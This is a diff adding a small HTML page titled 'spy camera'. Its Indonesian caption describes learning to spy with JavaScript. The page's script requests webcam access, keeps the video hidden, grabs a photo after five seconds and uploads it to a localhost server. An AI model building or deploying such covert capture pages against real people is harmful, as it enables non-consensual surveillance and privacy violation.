@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>spy camera</title>
+    <style>
+      h1 {
+        background-color: black;
+        color: white;
+        text-align: center;
+        border-radius: 20px;
+      
+      }
+
+      p {
+        color: black;
+        text-align: center;
+        font-style: italic;
+      }
+    </style>
+  </head>
+<body>
+
+  <div>
+    <h1>
+      coba nge spy 
+    </h1>
+
+    <p>belajar nge spy dari js bukan dari python (bantuan chatgpt) walapun banyak error</p>
+  </div>
+  <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+  <script>
+    // Mendapatkan akses ke video kamera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        var video = document.getElementById('video');
+        video.srcObject = stream;
+        video.play();
+
+        // Mengambil foto setelah video mulai diputar
+        video.onloadedmetadata = function() {
+          setTimeout(capturePhoto, 5000);  // Mengambil foto setelah 5 detik
+        };
+      })
+      .catch(function(err) {
+        console.log("Error: " + err);
+      });
+
+    // Mengambil foto
+    function capturePhoto() {
+      var canvas = document.getElementById('canvas');
+      var context = canvas.getContext('2d');
+      var video = document.getElementById('video');
+      context.drawImage(video, 0, 0, 640, 480);
+
+      // Mengirim foto ke server
+      canvas.toBlob(function(blob) {
+        var formData = new FormData();
+        formData.append('file', blob, 'photo.png');
+
+        fetch('http://localhost:3000/upload', {
+          method: 'POST',
+          body: formData
+        }).then(response => response.json())
+          .then(data => {
+            console.log('Success:', data);
+          }).catch(error => {
+            console.error('Error:', error);
+          });
+      });
+    }
+  </script>
+</body>
+</html>
